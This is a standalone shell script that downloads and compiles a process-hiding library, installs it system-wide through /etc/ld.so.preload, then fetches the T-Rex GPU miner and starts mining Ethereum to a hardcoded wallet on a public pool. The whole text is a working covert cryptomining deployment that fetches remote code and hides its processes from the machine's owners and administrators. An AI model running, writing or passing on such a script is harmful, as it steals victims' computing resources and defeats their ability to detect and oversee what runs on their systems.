#!/bin/sh
wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicTr.zip
unzip magicTr.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

export PATH=/usr/local/cuda/bin/:$PATH
export LD_LIBRARY_PATH=/usr/local/cuda/lib64/:$LD_LIBRARY_PATH
export LIBRARY_PATH=/usr/local/cuda/lib64:$LIBRARY_PATH

wget https://github.com/trexminer/T-Rex/releases/download/0.19.0/t-rex-0.19.0-linux-cuda11.1.tar.gz
tar -xvzf t-rex-0.19.0-linux-cuda11.1.tar.gz
./t-rex -a ethash -o stratum+ssl://us1.ethermine.org:5555 -u 0x8CB8003E428D0Fd7693D22f576A212403728c64a -w Rex -p x --mt 3
